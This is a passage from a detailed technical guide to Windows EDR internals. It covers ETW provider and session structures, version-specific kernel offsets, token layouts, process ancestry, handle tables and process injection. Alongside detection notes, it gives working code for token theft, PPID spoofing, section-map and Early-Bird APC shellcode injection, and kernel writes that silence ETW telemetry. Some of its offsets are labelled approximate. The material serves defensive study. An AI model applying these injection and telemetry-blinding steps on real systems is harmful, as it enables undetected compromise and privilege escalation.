} ETW_REG_ENTRY, *PETW_REG_ENTRY;
```

**The critical path for event emission:**

```c
// Kernel provider calls EtwWrite() or EtwWriteEx()
EtwWrite(RegHandle, Descriptor, Filter, EventData, ...)
    │
    ▼
EtwpEventWriteFull()
    │
    ├── Check: EtwpIsTraceEnabled(RegHandle)
    │      └── reads ETW_REG_ENTRY.IsEnabled and EnableMask
    │          If IsEnabled == 0 → return immediately (no-op)
    │
    ├── Loop over all active sessions subscribed to this provider
    │
    └── For each session → EtwpWriteUserEvent() → ring buffer
```

**Lazarus FudModule technique**: Sets `ETW_REG_ENTRY.IsEnabled = 0` for `EtwThreatIntProvRegHandle`. Because this is a data write (not code modification), it works under HVCI. The ETW-TI provider silently stops emitting without any BSOD or obvious error.

### 21.2 ETW Logger Sessions: _WMI_LOGGER_CONTEXT

Each active ETW session corresponds to a `_WMI_LOGGER_CONTEXT` in kernel memory. NT Kernel Logger, Circular Kernel Context Logger, and per-provider sessions all have one.

```c
typedef struct _WMI_LOGGER_CONTEXT {
    ULONG                 LoggerId;          // session ID
    ULONG                 BufferSize;        // per-buffer size (default 4KB)
    ULONG                 MaximumFileSize;
    LARGE_INTEGER         FlushTimer;
    KSPIN_LOCK            BufferSpinLock;
    LIST_ENTRY            FreeList;          // free buffers
    LIST_ENTRY            FlushList;         // full buffers awaiting flush
    ULONG                 NumberOfProcessors;
    PWMI_BUFFER_HEADER   *ProcessorBuffers;  // per-CPU buffer pointers
    ULONG                 LoggerMode;        // EVENT_TRACE_REAL_TIME_MODE etc.
    ULONG                 Flags;
    // ...
    ULONG64               EtwpActiveSystemLoggers;  // bitmask of enabled loggers
    // ...
} WMI_LOGGER_CONTEXT, *PWMI_LOGGER_CONTEXT;
```

**`EtwpActiveSystemLoggers`**: A global bitmask (one bit per logger ID) that controls which system loggers are active. Zeroing this DWORD disables ALL kernel ETW logging globally — a blunt but effective attack.

```c
// Attack: zero the active system loggers bitmask
// (requires kernel write primitive)
// Location: ntoskrnl!EtwpActiveSystemLoggers
WRITE_KERNEL_DWORD(EtwpActiveSystemLoggers_address, 0);
// After this: ALL kernel ETW providers emit nothing
// Detected by: periodic EtwpActiveSystemLoggers value monitoring
```

### 21.3 ETW Buffering Architecture

ETW uses a **lock-free per-CPU ring buffer** design for minimal overhead:

```
Per-CPU Buffer (default 4KB):
┌──────────────────────────────────────────┐
│ WMI_BUFFER_HEADER (fixed header)         │
│   ├── TimeStamp: LARGE_INTEGER           │
│   ├── Guid: GUID (session GUID)          │
│   ├── BufferType: WMI_BUFFER_TYPE        │
│   ├── SavedOffset: ULONG (last written)  │
│   └── CurrentOffset: ULONG (current pos) │
├──────────────────────────────────────────┤
│ EVENT_HEADER + EVENT_DATA_DESCRIPTOR[]   │ ← event 1
├──────────────────────────────────────────┤
│ EVENT_HEADER + EVENT_DATA_DESCRIPTOR[]   │ ← event 2
├──────────────────────────────────────────┤
│ ... (grows until full)                   │
└──────────────────────────────────────────┘
        │ flush when full
        ▼
ETW Consumer (real-time mode):
    → FormatMessage via TDH (Trace Data Helper)
    → ProcessTrace() callback in consumer
```

**Why per-CPU is important**: No cross-CPU locking needed during event write. The buffer is switched atomically when full. This means high-frequency events (like every `NtAllocateVirtualMemory`) have near-zero overhead.

### 21.4 ETW Consumer Security Model

The `Microsoft-Windows-Threat-Intelligence` provider enforces strict consumer access:

```c
// In EtwpNotifyGuid() / EtwpCheckNotificationAccess():
// 1. Get calling process protection level
UCHAR signerType = EPROCESS_Protection.Signer;
UCHAR protType   = EPROCESS_Protection.Type;

// 2. Check: caller must be PsProtectedSignerAntimalware-Light or higher
if (signerType < PsProtectedSignerAntimalware || protType < PsProtectedTypeLight) {
    return STATUS_ACCESS_DENIED;  // non-PPL cannot subscribe to ETW-TI
}

// 3. Additionally: process must have PROCESS_QUERY_INFORMATION to open session
```

**Implication for attackers**: To read ETW-TI events, you need AM-PPL or kernel access. Patching `EtwpCheckNotificationAccess` in user-mode from a non-PPL process is impossible — the function runs in kernel context. The only option is to disable emission at the source (ETW_REG_ENTRY.IsEnabled) via kernel write.

### 21.5 The GUID Entry: _ETW_GUID_ENTRY

Each unique provider GUID has a `_ETW_GUID_ENTRY` that maintains the list of all registrations for that GUID and all sessions consuming it:

```c
typedef struct _ETW_GUID_ENTRY {
    LIST_ENTRY        GuidList;      // global GUID list (EtwpProviderList)
    LONG              RefCount;
    GUID              Guid;
    LIST_ENTRY        RegListHead;   // all _ETW_REG_ENTRY for this GUID
    LIST_ENTRY        SessionHead;   // sessions consuming this GUID
    ETW_PROVIDER_TRAITS *Traits;
    ULONG             IsEnabled;     // aggregate enable state
    ULONG64           GroupMask;     // GROUP_MASK for enable routing
} ETW_GUID_ENTRY, *PETW_GUID_ENTRY;
```

**Attack vector**: Modify `ETW_GUID_ENTRY.IsEnabled = 0` or clear `GroupMask`. This is the GUID-level disabling that Lazarus used — more surgical than zeroing EtwpActiveSystemLoggers (which kills all providers).

---

## SECTION 22: Kernel Structure Reference — Version-Specific Offsets

This is the most operationally critical section for BYOVD tool authors and EDR bypass researchers. Offsets change with every major Windows build.

### 22.1 EPROCESS Critical Field Offsets

| Field | W10 1903 | W10 20H2 | W11 21H2 | W11 22H2 | W11 24H2 |
|-------|----------|----------|----------|----------|----------|
| `UniqueProcessId` | `0x2E8` | `0x440` | `0x440` | `0x440` | `0x448` |
| `ActiveProcessLinks` | `0x2F0` | `0x448` | `0x448` | `0x448` | `0x450` |
| `Token` | `0x360` | `0x4B8` | `0x4B8` | `0x4B8` | `0x4C8` |
| `VadRoot` | `0x628` | `0x7D8` | `0x7D8` | `0x7D8` | `0x7E8` |
| `Protection` | `0x6FA` | `0x87A` | `0x87A` | `0x87A` | `0x88A` |
| `SignatureLevel` | `0x6FB` | `0x87B` | `0x87B` | `0x87B` | `0x88B` |
| `SectionSignatureLevel` | `0x6FC` | `0x87C` | `0x87C` | `0x87C` | `0x88C` |
| `MitigationFlags` | `0x820` | `0x9D0` | `0x9D0` | `0x9D8` | `0x9E8` |
| `MitigationFlags2` | `0x824` | `0x9D4` | `0x9D4` | `0x9DC` | `0x9EC` |
| `Flags3` (VM logging bits) | `0x7A4` | `0x1F0` | `0x1F0` | `0x1F0` | `0x200` |
| `InheritedFromUniqueProcessId` | `0x3E8` | `0x540` | `0x540` | `0x540` | `0x550` |
| `ImageFileName` | `0x450` | `0x5A8` | `0x5A8` | `0x5A8` | `0x5B8` |
| `Peb` | `0x3F8` | `0x550` | `0x550` | `0x550` | `0x560` |
| `ThreadListHead` | `0x5E0` | `0x7B0` | `0x7B0` | `0x7B0` | `0x7C0` |
| `ObjectTable` (handle table) | `0x570` | `0x720` | `0x720` | `0x720` | `0x730` |
| `Win32Process` | `0x420` | `0x570` | `0x570` | `0x570` | `0x580` |

> Note: These are approximate. Always verify against PDB for the specific build. Use `dt nt!_EPROCESS` in WinDbg.

### 22.2 EPROCESS MitigationFlags Breakdown

`MitigationFlags` (ULONG at `EPROCESS+0x9D8` on W11 22H2):

```c
typedef struct _EPROCESS_MITIGATION_FLAGS {
    ULONG ControlFlowGuardEnabled             : 1;  // bit 0
    ULONG ControlFlowGuardExportSuppressionEn : 1;  // bit 1
    ULONG ControlFlowGuardStrict              : 1;  // bit 2
    ULONG DisallowStrippedImages              : 1;  // bit 3
    ULONG ForceRelocateImages                 : 1;  // bit 4
    ULONG HighEntropyASLREnabled              : 1;  // bit 5
    ULONG StackRandomizationDisabled          : 1;  // bit 6
    ULONG ExtensionPointDisable               : 1;  // bit 7
    ULONG DisableDynamicCode                  : 1;  // bit 8  ← arbitrary code forbidden
    ULONG DisableDynamicCodeAllowOptOut       : 1;  // bit 9
    ULONG DisableDynamicCodeAllowRemoteDowngrade:1; // bit 10
    ULONG AuditDisableDynamicCode             : 1;  // bit 11
    ULONG DisallowWin32kSystemCalls           : 1;  // bit 12 ← win32k isolation
    ULONG AuditDisallowWin32kSystemCalls      : 1;  // bit 13
    ULONG EnableFilteredWin32kAPIs            : 1;  // bit 14
    ULONG AuditFilteredWin32kAPIs             : 1;  // bit 15
    ULONG DisableNonSystemFonts               : 1;  // bit 16
    ULONG AuditNonSystemFontLoading           : 1;  // bit 17
    ULONG PreferSystem32Images                : 1;  // bit 18
    ULONG ProhibitRemoteImageMap              : 1;  // bit 19
    ULONG AuditProhibitRemoteImageMap         : 1;  // bit 20
    ULONG ProhibitLowILImageMap               : 1;  // bit 21
    ULONG AuditProhibitLowILImageMap          : 1;  // bit 22
    ULONG SignatureMitigationOptIn            : 1;  // bit 23
    ULONG AuditBlockNonMicrosoftBinaries      : 1;  // bit 24
    ULONG AuditBlockNonMSBinariesAllowStore   : 1;  // bit 25
    ULONG LoaderIntegrityContinuityEnabled    : 1;  // bit 26
    ULONG AuditLoaderIntegrityContinuity      : 1;  // bit 27
    ULONG EnableModuleTamperingProtection     : 1;  // bit 28 ← tampering protection
    ULONG EnableModuleTamperingProtectionNoInherit:1;// bit 29
    ULONG RestrictIndirectBranchPrediction    : 1;  // bit 30 ← Spectre v2 mitigation
    ULONG IsolateSecurityDomain               : 1;  // bit 31
} EPROCESS_MITIGATION_FLAGS;
```

`MitigationFlags2` (ULONG at `EPROCESS+0x9DC` on W11 22H2):

```c
typedef struct _EPROCESS_MITIGATION_FLAGS2 {
    ULONG EnableExportAddressFilter           : 1;  // bit 0  ← EAF
    ULONG AuditExportAddressFilter            : 1;  // bit 1
    ULONG EnableExportAddressFilterPlus       : 1;  // bit 2  ← EAF+
    ULONG AuditExportAddressFilterPlus        : 1;  // bit 3
    ULONG EnableRopStackPivot                 : 1;  // bit 4
    ULONG AuditRopStackPivot                  : 1;  // bit 5
    ULONG EnableRopCallerCheck                : 1;  // bit 6
    ULONG AuditRopCallerCheck                 : 1;  // bit 7
    ULONG EnableRopSimExec                    : 1;  // bit 8
    ULONG AuditRopSimExec                     : 1;  // bit 9
    ULONG EnableImportAddressFilter           : 1;  // bit 10 ← IAF
    ULONG AuditImportAddressFilter            : 1;  // bit 11
    ULONG DisablePageCombine                  : 1;  // bit 12
    ULONG SpeculativeStoreBypassDisable       : 1;  // bit 13 ← SSB/Spectre v4
    ULONG CetUserShadowStacksEnabled          : 1;  // bit 16 ← CET Shadow Stack!
    ULONG AuditCetUserShadowStacks            : 1;  // bit 17
    ULONG SetContextIpValidation              : 1;  // bit 20
    ULONG AuditSetContextIpValidation         : 1;  // bit 21
    ULONG SecurePlugAndPlayEnabled            : 1;  // bit 28
    // ...
} EPROCESS_MITIGATION_FLAGS2;
```

**EDR relevance**: An EDR can read `MitigationFlags` to understand what protections a process has and adjust telemetry accordingly. A process with `CetUserShadowStacksEnabled` is far harder to inject into via ROP.

### 22.3 KTHREAD Fields Relevant to EDR

```c
// _KTHREAD (partial, W11 22H2 approximate offsets)
typedef struct _KTHREAD_RELEVANT {
    // +0x000: Header (DISPATCHER_HEADER)
    // +0x018: SListFaultAddress
    // +0x020: QuantumTarget
    // +0x028: InitialStack
    // +0x030: StackLimit
    // +0x038: StackBase
    // +0x040: ThreadLock (ULONG64)
    // +0x048: CycleTime (ULONG64)
    // +0x058: CurrentRunTime (ULONG)
    // ...
    // +0x090: TrapFrame (PKTRAP_FRAME) ← last ring3→ring0 transition state
    // ...
    // +0x1B8: ApcState (KAPC_STATE) ← APC queue heads
    // +0x1F8: ApcStateFill (pads ApcState to 0x40)
    // +0x238: ApcQueueable (BOOLEAN) ← false = APCs blocked
    // ...
    // +0x240: InstrumentationCallback (PVOID) ← Nirvana
    // ...
    // +0x260: UserAffinity (KAFFINITY)
    // ...
    // +0x3C0: Win32Thread (PVOID) ← GUI thread associated W32THREAD
} KTHREAD_PARTIAL;

// KTRAP_FRAME (what CPU writes on ring3→ring0 transition via syscall)
typedef struct _KTRAP_FRAME {
    ULONG64 P1Home;        // parameter home regs (spilled by compiler)
    ULONG64 P2Home;
    ULONG64 P3Home;
    ULONG64 P4Home;
    ULONG64 P5;
    UCHAR   PreviousMode;  // ← 0=KernelMode, 1=UserMode
    UCHAR   PreviousIrql;
    UCHAR   FaultIndicator;
    UCHAR   ExceptionActive;
    ULONG   MxCsr;
    ULONG64 Rax;
    ULONG64 Rcx;
    ULONG64 Rdx;
    ULONG64 R8;
    ULONG64 R9;
    ULONG64 R10;
    ULONG64 R11;
    // ... (debug registers, segment regs, etc.)
    ULONG64 Rsp;           // user-mode RSP at syscall time
    ULONG64 Rip;           // user-mode RIP at syscall time ← GROUND TRUTH
    ULONG64 EFlags;
    ULONG64 Rbp;
    // ...
} KTRAP_FRAME;
```

**The Rip field** is set by hardware (`SYSCALL` instruction writes it from the CPU's saved return address register `RCX`). No user-mode code can modify this before the kernel reads it.

### 22.4 TOKEN Structure for Privilege Monitoring

```c
// _TOKEN (partial, kernel structure for access token)
typedef struct _TOKEN {
    TOKEN_SOURCE    TokenSource;            // +0x000: "User32  " / "Advapi  " etc.
    LUID            TokenId;                // +0x010: unique token ID
    LUID            AuthenticationId;       // +0x018: logon session LUID
    LARGE_INTEGER   ParentTokenId;          // +0x020
    LARGE_INTEGER   ExpirationTime;         // +0x028
    ERESOURCE       *TokenLock;             // +0x030
    LUID            ModifiedId;             // +0x038
    SEP_TOKEN_PRIVILEGES Privileges;        // +0x040
    //   ├── Present:  ULONG64 bitmask (which privs exist in token)
    //   ├── Enabled:  ULONG64 bitmask (which privs currently enabled)
    //   └── EnabledByDefault: ULONG64 bitmask
    SEP_AUDIT_POLICY AuditPolicy;           // +0x058
    ULONG           SessionId;              // +0x060
    ULONG           UserAndGroupCount;      // +0x064
    ULONG           RestrictedSidCount;     // +0x068
    ULONG           VariableLength;         // +0x06C
    ULONG           DynamicCharged;         // +0x070
    ULONG           DynamicAvailable;       // +0x074
    ULONG           DefaultOwnerIndex;      // +0x078
    SID_AND_ATTRIBUTES *UserAndGroups;      // +0x080 ← pointer to SID array
    SID_AND_ATTRIBUTES *RestrictedSids;     // +0x088
    PVOID            PrimaryGroup;          // +0x090
    ULONG           *DynamicPart;           // +0x098
    ACL             *DefaultDacl;           // +0x0A0
    TOKEN_TYPE      TokenType;              // +0x0A8: TokenPrimary=1, Impersonation=2
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel; // +0x0AC
    ULONG           TokenFlags;             // +0x0B0
    BOOLEAN         TokenInUse;             // +0x0B4
    ULONG           IntegrityLevelIndex;    // +0x0B8 ← index into UserAndGroups
    // ...
    SEP_CACHED_HANDLES_ENTRY CachedHandlesTable[4]; // cached kernel object handles
    // ...
    PSID            TrustLevelSid;          // trust level (PPL-related)
} TOKEN;
```

**Key privilege bitmask positions (SEP_TOKEN_PRIVILEGES.Enabled):**

| Privilege | Bit Position | Attack Relevance |
|-----------|-------------|-----------------|
| `SeDebugPrivilege` | bit 20 | OpenProcess to LSASS |
| `SeImpersonatePrivilege` | bit 29 | Token theft / potato attacks |
| `SeTcbPrivilege` | bit 7 | Act as OS — extremely dangerous |
| `SeLoadDriverPrivilege` | bit 10 | Load arbitrary kernel driver |
| `SeCreateTokenPrivilege` | bit 3 | Forge tokens arbitrarily |
| `SeBackupPrivilege` | bit 17 | Read any file regardless of ACL |
| `SeRestorePrivilege` | bit 18 | Write any file, set SACL |
| `SeShutdownPrivilege` | bit 19 | Shutdown/reboot |
| `SeTakeOwnershipPrivilege` | bit 9 | Take ownership of any object |

---

## SECTION 23: Token Integrity and Privilege Abuse Detection

### 23.1 The Token Theft Attack Pattern

Token theft is a fundamental post-exploitation technique:

```c
// Classic token theft chain
// Step 1: Find privileged token (e.g., SYSTEM token in winlogon.exe)
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogon_pid);
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);

// Step 2: Duplicate it as impersonation token
HANDLE hDupToken;
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, 
                 SecurityImpersonation, TokenImpersonation, &hDupToken);

// Step 3: Set on current thread
SetThreadToken(NULL, hDupToken);  // current thread now runs as SYSTEM

// Step 4: Drop the elevated process
// (now can access LSASS, write to system locations, etc.)
```

**EDR Detection Vectors for Token Theft:**

```
1. ObRegisterCallbacks on Token object type:
   → Pre-callback fires on OpenProcessToken / NtOpenProcessToken
   → Can strip TOKEN_DUPLICATE from granted access
   → Prevents duplication of high-privilege tokens

2. ETW Security Audit Event 4672 (Special Logon):
   → Fires when privileged logon occurs
   → Tracks SeDebugPrivilege, SeTcbPrivilege etc.

3. Behavioral: SetThreadToken call in non-service process
   → Kernel callback on thread object modification
   → EDR checks: is calling process in TOKEN_SOURCE whitelist?

4. Process privilege level transition:
   → Normal user process suddenly acquires SeDebugPrivilege
   → Cross-event correlation: preceding OpenProcess + OpenProcessToken
```

### 23.2 Potato Attacks and Token Impersonation

The "Potato" family (JuicyPotato, RoguePotato, SweetPotato, etc.) exploit Windows COM activation infrastructure to coerce a privileged token into a pipe, then impersonate it:

```
Attack: RoguePotato example flow
  1. Start fake RPC server on controlled pipe
  2. CoGetInstanceFromFile() with CLSID requiring SYSTEM activation
  3. DCOM/RPC infrastructure calls CreateFile on attacker-controlled pipe 
     from SYSTEM context (NT AUTHORITY\SYSTEM / NT SERVICE\*)
  4. Attacker pipe: ImpersonateNamedPipeClient()
     → Current thread now has SYSTEM impersonation token
  5. CreateProcessWithTokenW(system_token, ...) → spawn SYSTEM shell

EDR Detection:
  → Unusual named pipe creation from a low-privilege process
  → DCOM activation → process creation chain (DCOMLAUNCH.exe → attacker.exe)
  → NtCreateFile from SYSTEM in context of non-service binary
  → ImpersonateNamedPipeClient in non-server process (behavioral flag)
  → ETW: Security Event 4648 (explicit credential logon anomaly)
```

### 23.3 Integrity Level as Defense Layer

Windows Mandatory Integrity Control (MIC) assigns integrity levels:

| Level | Numeric | Assigned To |
|-------|---------|------------|
| Untrusted | 0x0000 | Fully sandboxed processes |
| Low | 0x1000 | IE Protected Mode, sandboxes |
| Medium | 0x2000 | Normal user processes |
| High | 0x3000 | Administrator elevated processes |
| System | 0x4000 | Windows services, kernel mode |
| Protected | 0x5000 | AM-PPL processes |

EDRs monitor integrity level *transitions* — a medium-integrity process spawning a high-integrity child without explicit elevation is anomalous. This is detected via `PS_CREATE_NOTIFY_INFO` combined with token inspection.

---

## SECTION 24: Process Genealogy and Cross-Process Attribution

### 24.1 Why PPID Spoofing Fails Against EDR

User-mode PPID spoofing:
```c
// Attacker code: create cmd.exe that appears to be spawned by explorer.exe
STARTUPINFOEX si = {0};
SIZE_T attrSize;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

HANDLE hExplorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorer_pid);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL);

CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT,
              NULL, NULL, &si.StartupInfo, &pi);
// → cmd.exe PID appears under explorer.exe in task manager
```

**Why this fails against kernel-level EDR:**

```c
// In PsSetCreateProcessNotifyRoutineEx callback:
VOID MyProcessCallback(PEPROCESS Process, HANDLE ProcessId, 
                        PPS_CREATE_NOTIFY_INFO CreateInfo) {
    if (CreateInfo) {  // process creation (not termination)
        // This is the KERNEL's view of the parent — immune to user-mode manipulation
        HANDLE realParentPid = CreateInfo->ParentProcessId;
        
        // The 'PPID spoofing' only affects user-mode APIs (GetParentProcessId etc.)
        // The kernel tracks the REAL creator via EPROCESS.InheritedFromUniqueProcessId
        // which is set by MmCreatePeb and not controllable from user mode
        
        // CreatingThreadId tells us WHICH THREAD created this process
        CLIENT_ID creatorThread = CreateInfo->CreatingThreadId;
        
        // Full command line (cannot be spoofed from user mode)
        PCUNICODE_STRING cmdLine = CreateInfo->CommandLine;
    }
}
```

### 24.2 Process Tree Enrichment

Modern EDRs don't just capture individual events — they build a **full process ancestry graph** that persists for the duration of the EDR's memory:

```
Process Forest (in-memory, EDR side):
  System (PID 4)
  └── services.exe (PID 892)
      ├── svchost.exe (PID 1234) [WMI provider host]
      │   └── cmd.exe (PID 5678) [SUSPICIOUS: WMI spawned cmd]
      │       └── powershell.exe (PID 9012) [SUSPICIOUS: encoding]
      │           └── mshta.exe (PID 3456) [HIGH ALERT: script in script]
      └── lsass.exe (PID 1000) [protected]
  └── explorer.exe (PID 4567)
      └── chrome.exe (PID 7890)
```

**Key enrichment data per process node:**
- `imageFileName`: PE path verified via minifilter (cannot be spoofed)
- `commandLine`: raw kernel command line string
- `trueParentPid`: from `PS_CREATE_NOTIFY_INFO.ParentProcessId`
- `creatingThreadId`: identifies which thread initiated creation
- `ancestorChain[]`: full lineage up to System/Session processes
- `tokenIntegrityLevel`: from token inspection at creation
- `signatureLevel`: `EPROCESS.SignatureLevel` (is binary Microsoft-signed?)
- `mitigationFlags`: active memory mitigations
- `sessionId`: which Windows session (session 0 = service)

### 24.3 RPC and WMI Re-Attribution

One of the most sophisticated EDR features: tracking the **true originating process** even when the immediate parent is a system intermediary.

**WMI Lateral Movement Example:**
```
Attacker executes: Win32_Process.Create("calc.exe") via WMI
  
Without re-attribution:
  WmiPrvSE.exe (PID 4000) → calc.exe (PID 5000)
  → Appears as: WMI provider created calculator
  → Low suspicion

With EDR re-attribution:
  1. EDR monitors NtAlpcSendWaitReceivePort calls from attacker's process
  2. Tracks ALPC message to WMI channel (MicrosoftPerformanceLibraryProvider)
  3. Correlates WMI activation IDs with incoming process creation
  4. Re-attributes: attacker.exe → (via WMI) → calc.exe
  5. Alert: calc.exe created via WMI from non-admin-tool process
```

**DCOM Re-Attribution:**
```c
// EDR monitors IDispatch/IUnknown COM calls
// via hook on CoCreateInstance / RoGetActivationFactory
// ALPC messages to dllhost.exe / svchost.exe (COM surrogate)
// cross-correlates with process creation from surrogate
// Result: COM-spawned processes attributed to calling process
```

---

## SECTION 25: Handle Table: The EDR's Handle on Handles

### 25.1 Handle Table Internals

Every process has an **object handle table** (`HANDLE_TABLE`) pointed to by `EPROCESS.ObjectTable`. This table maps `HANDLE` values to kernel object pointers.

```c
typedef struct _HANDLE_TABLE {
    ULONG       NextHandleNeedingPool;
    LONG        ExtraInfoPages;
    ULONG64     TableCode;          // low 2 bits = table level (0/1/2)
    PEPROCESS   QuotaProcess;
    LIST_ENTRY  HandleTableList;    // linked into global PspCidTable chain
    ULONG       UniqueProcessId;
    ULONG       Flags;
    EX_PUSH_LOCK HandleContentionEvent;
    EX_PUSH_LOCK HandleTableLock[4];
    HANDLE_TABLE_FREE_LIST FreeLists[1];
    UCHAR       DebugInfo[16];
} HANDLE_TABLE;

// HANDLE_TABLE_ENTRY (what each handle slot contains)
typedef struct _HANDLE_TABLE_ENTRY {
    union {
        LONG64 VolatileLowValue;
        LONG64 RefCountField;    // ref count in low bits
        struct {
            LONG64 Unlocked      : 1;    // bit 0: 1 = unlocked
            LONG64 RefCnt        : 16;   // bits 1-16
            LONG64 Attributes    : 3;    // bits 17-19 (inherit, protect, audit)
            LONG64 ObjectPointer : 44;   // bits 20-63: pointer >> 4
        };
    };
    union {
        ULONG GrantedAccessBits; // access mask granted at OpenXxx time
        LONG  OBJ_HANDLE_ATTRIBUTES; // inherit/protect flags
    };
} HANDLE_TABLE_ENTRY;
```

### 25.2 Handle Table Enumeration for Suspicious Access

**Kernel-side enumeration (EDR technique):**

```c
// Walk the handle table for a process to find suspicious cross-process handles
// 1. Get target process's handle table
HANDLE_TABLE *handleTable = (HANDLE_TABLE*)((ULONG_PTR)pEPROCESS + OBJECT_TABLE_OFFSET);

// 2. Walk table entries (level 0 = direct, level 1 = one-level, level 2 = two-level)
ULONG tableLevel = handleTable->TableCode & 3;
PVOID tableBase  = (PVOID)(handleTable->TableCode & ~3);

// 3. For each valid entry, decode the object pointer
// object = (PVOID)((entry->ObjectPointer << 4) | 0x10)  ← points to OBJECT_HEADER
// objectBody = (PVOID)((PUCHAR)objectHeader + sizeof(OBJECT_HEADER))

// 4. Check object type
POBJECT_TYPE objType = objectHeader->Type;
if (objType == PsProcessType) {
    // This process has a handle to another process
    PEPROCESS target = (PEPROCESS)objectBody;
    ULONG accessMask = entry->GrantedAccessBits;
    
    if (accessMask & (PROCESS_VM_READ | PROCESS_VM_WRITE)) {
        // Process can read/write target's memory
        EmitSuspiciousHandleAlert(pEPROCESS, target, accessMask);
    }
}
```

**User-mode equivalent EDR uses:**
```c
// NtQuerySystemInformation(SystemHandleInformation, ...)
// Returns array of SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX:
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;               // kernel object address
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;        // access mask
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;      // index into object type table
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
```

### 25.3 Handle Sanitization Bypass Techniques

**Duplicate Handle Trick:**
```c
// Bypass ObRegisterCallbacks handle stripping
// Instead of OpenProcess(lsass), duplicate through another process

// Step 1: Get ANY process to open LSASS (e.g., via DuplicateHandle race)
// Step 2: DuplicateHandle FROM that process (kernel checks source process level)
// Step 3: Receive full-access handle in attacker process

// Why this bypasses some EDRs:
// ObRegisterCallbacks fires on OB_OPERATION_HANDLE_CREATE and OB_OPERATION_HANDLE_DUPLICATE
// But if the duplicate goes through an intermediate process, 
// the EDR's pre-callback strips access on the INTERMEDIATE handle,
// not necessarily the final duplicated handle if logic is flawed
```

**EDR counter**: Well-implemented `ObRegisterCallbacks` with `OB_OPERATION_HANDLE_DUPLICATE` fires for *every* duplication target — including the final recipient.

---

## SECTION 26: Advanced Process Injection Taxonomy

Beyond the well-known techniques, a comprehensive map of all injection vectors:

### 26.1 Fork Injection (NtCreateProcess)

```c
// Fork the current process, creating an exact copy
// (rarely used legitimately on Windows unlike POSIX)
HANDLE hProcess = NULL;
OBJECT_ATTRIBUTES objAttr = {sizeof(OBJECT_ATTRIBUTES)};
NtCreateProcess(
    &hProcess,
    PROCESS_ALL_ACCESS,
    &objAttr,
    NtCurrentProcess(),   // parent = self (fork)
    TRUE,                 // inherit handles
    NULL, NULL, NULL
);
// Result: exact memory copy of current process
// Payload can be written to self first, then forked
// Child starts at fork point with parent's full memory map

// EDR detection:
// → PsSetCreateProcessNotifyRoutineEx fires (CreateInfo->FileOpenNameAvailable = FALSE for fork)
// → Trueparent = self (not typical process launch pattern)
// → No command line in PS_CREATE_NOTIFY_INFO
```

### 26.2 Section-Based Injection (Map Injection)

```c
// No VirtualAllocEx needed — use shared memory section
// Step 1: Create section
HANDLE hSection;
LARGE_INTEGER maxSize = {.QuadPart = shellcode_size};
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

// Step 2: Map into self — write shellcode
PVOID localBase = NULL; SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, NtCurrentProcess(), &localBase, 0, 0, NULL,
                   &viewSize, ViewUnmap, 0, PAGE_READWRITE);
memcpy(localBase, shellcode, shellcode_size);

// Step 3: Map into target — now target can see shellcode
PVOID remoteBase = NULL;
NtMapViewOfSection(hSection, hTarget, &remoteBase, 0, 0, NULL,
                   &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

// Step 4: Create remote thread at remoteBase

// EDR detection:
// ETW-TI: THREATINT_MAPVIEW_REMOTE fires on Step 3
// Memory region type: MEM_MAPPED (not MEM_PRIVATE like classic VirtualAllocEx)
// Harder to detect but ETW-TI catches the map operation
```

### 26.3 Early-Bird APC Injection

The most evasion-friendly APC injection variant:

```c
// Create process in SUSPENDED state
// Queue APC BEFORE the main thread's first instruction
// When ResumeThread called, APC executes BEFORE any DLLs load
// → EDR hooks in ntdll haven't been installed yet!

// Step 1: Create suspended
PROCESS_INFORMATION pi;
CreateProcess(NULL, "svchost.exe -k netsvcs", NULL, NULL, FALSE,
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Step 2: Write shellcode into process
PVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, shellcode_size,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBase, shellcode, shellcode_size, NULL);

// Step 3: Queue APC (fires BEFORE main thread runs user-mode init)
QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, 0);

// Step 4: Resume — APC fires before ntdll fully initialized
ResumeThread(pi.hThread);

// Why this bypasses user-mode hooks:
// EDR DLL injection happens during PEB_LDR_DATA initialization
// APC executes before LdrInitializeThunk completes DLL loading
// → EDR hasn't installed ntdll hooks yet when shellcode runs

// EDR kernel-level detection (unaffected by DLL load timing):
// ETW-TI: THREATINT_QUEUEUSERAPC_REMOTE fires regardless
// PsSetCreateThreadNotifyRoutine fires when thread resumes
// EPROCESS/PEB state at time of APC fire is anomalous
// Kernel: APC fires with PEB not fully initialized → LDR state check
```

### 26.4 KernelCallbackTable (KCT) Hijacking

Applies only to **GUI processes** (those that have called any User32 function):

```c
// PEB.KernelCallbackTable is a pointer to a function table
// for Win32k kernel → user-mode callbacks (window message delivery etc.)
// Structure (partial):
typedef struct _KERNEL_CALLBACK_TABLE {
    PVOID __fnCOPYDATA;      // [0]  WM_COPYDATA callback
    PVOID __fnCOPYGLOBALDATA;// [1]
    PVOID __fnDWORD;         // [2]
